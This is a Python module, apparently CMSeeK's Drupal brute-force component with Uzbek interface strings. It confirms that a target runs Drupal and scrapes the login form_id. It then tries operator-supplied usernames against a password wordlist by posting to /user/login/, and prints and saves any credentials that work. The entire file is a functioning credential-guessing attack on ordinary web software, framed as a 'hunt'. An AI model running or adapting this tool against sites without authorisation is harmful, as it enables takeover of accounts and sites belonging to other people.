import cmseekdb.basic as cmseek 
import cmseekdb.sc as source 
import cmseekdb.header as header 
import multiprocessing 
from functools import partial 
import sys
import requests
import re
import cmseekdb.generator as generator


def testlogin(url,user,passw,formid):
    if url.endswith('/'):
        loginUrl = url + 'user/login/'
        redirect = url + 'user/1/'
    else:
        loginUrl = url + '/user/login/'
        redirect = url + '/user/1/'

    post = { 'name': user, 'pass': passw, 'form_id': formid, 'op': 'Kirish', 'location': redirect }
    session = requests.Session()
    response = session.post(loginUrl, data=post)
    return response.url

def start():
    cmseek.clearscreen()
    cmseek.banner("Drupal Brutfors Moduli")
    url = cmseek.targetinp("") # input('URLni kiriting: ')
    cmseek.info("Drupal uchun tekshirilmoqda")
    bsrc = cmseek.getsource(url, cmseek.randomua('onceuponatime'))
    if bsrc[0] != '1':
        cmseek.error("Maqsad manbasini olish imkonsiz, CMSeek yopilmoqda")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'dru':
            drucnf = '1'
        else:
            try2 = source.check(bsrc[1], url) # Boshqa manba kod tekshiruvlari bilan Drupalni tasdiqlash
            if try2[0] == '1' and try2[1] == 'dru':
                drucnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Sarlavhalar tekshiruvi!
                if try3[0] == '1' and try3[1] == 'dru':
                    drucnf = '1'
                else:
                    drucnf = '0'
    if drucnf != '1':
        cmseek.error('Drupal tasdiqlanmadi... CMSeek yopilmoqda')
        cmseek.handle_quit()
    else:
        cmseek.success("Drupal tasdiqlandi... Drupal kirish formasi tekshirilmoqda")
        druloginsrc = cmseek.getsource(url + '/user/login/', cmseek.randomua('therelivedaguynamedkakashi'))
        if druloginsrc[0] == '1' and '<form' in druloginsrc[1] and 'name="form_id" value="' in druloginsrc[1]:
            cmseek.success("Kirish formasi topildi! Forma identifikator qiymati olinmoqda")
            fid = re.findall(r'name="form_id" value="(.*?)"', druloginsrc[1])
            if fid == []:
                cmseek.error("Forma identifikatori topilmadi, CMSeeK yopilmoqda!")
                cmseek.handle_quit()
            else:
                cmseek.success('Forma identifikatori topildi: ' + cmseek.bold + fid[0] + cmseek.cln)
                form_id = fid[0]
            druparamuser = ['']
            rawuser = input("[~] Foydalanuvchi nomlarini vergul bilan ajratib kiriting, bo'sh joy qo'ymang (masalan: cris,harry): ").split(',')
            for rusr in rawuser:
                druparamuser.append(rusr)
            drubruteusers = set(druparamuser) ## Takrorlanadigan foydalanuvchi nomlarini olib tashlash

            for user in drubruteusers:
                if user != '':
                    print('\n')
                    cmseek.info("Foydalanuvchi uchun brutfors: " + cmseek.bold + user + cmseek.cln)
                    with open("wordlist/passwords.txt", "r") as pwd_file:
                        passwords = pwd_file.read().split('\n')
                    passwords.insert(0, user)
                    passfound = '0'
                    for password in passwords:
                        if password != '' and password != '\n':
                            sys.stdout.write('[*] Parol sinovdan o‘tkazilmoqda: ')
                            sys.stdout.write('%s\r\r' % password)
                            sys.stdout.flush()
                            cursrc = testlogin(url, user, password, form_id)
                            if '/user/login/' in str(cursrc):
                                continue
                            else:
                                cmseek.success('Parol topildi! \n\n\n')
                                cmseek.success('Parol topildi!')
                                print(" |\n |--[foydalanuvchi]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[parol]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                                cmseek.success('Ov muvaffaqiyatli yakunlandi!')
                                cmseek.savebrute(url,url + '/user/login',user,password)
                                passfound = '1'
                                break
                            break
                    if passfound == '0':
                        cmseek.error('\n\nParol topilmadi!')
                    print('\n\n')

        else:
            cmseek.error("Kirish formasi topilmadi... CMSeeK yopilmoqda")
            cmseek.handle_quit()